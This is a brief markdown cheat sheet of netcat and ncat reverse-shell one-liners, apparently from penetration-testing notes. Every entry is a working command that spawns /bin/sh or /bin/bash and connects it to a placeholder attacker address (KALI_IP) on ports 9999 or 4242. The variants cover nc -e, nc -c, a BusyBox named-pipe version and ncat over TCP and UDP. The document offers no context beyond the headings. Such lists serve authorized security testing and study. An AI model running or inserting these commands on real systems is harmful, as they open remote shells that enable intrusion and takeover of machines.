---
title: Netcat Reverse Shells
tags: shells/reverse/netcat
share: true
date: 2024-12-15
---

## Basic Netcat Reverse Shells

```bash
nc -e /bin/sh KALI_IP 9999
```

```bash
nc -e /bin/bash KALI_IP 9999
```

```bash
nc -c bash KALI_IP 9999
```

## Netcat BusyBox Reverse Shell

```bash
rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc KALI_IP 9999 >/tmp/f
```

## Ncat Reverse Shells

```bash
ncat KALI_IP 4242 -e /bin/bash
```

```bash
ncat --udp KALI_IP 4242 -e /bin/bash
```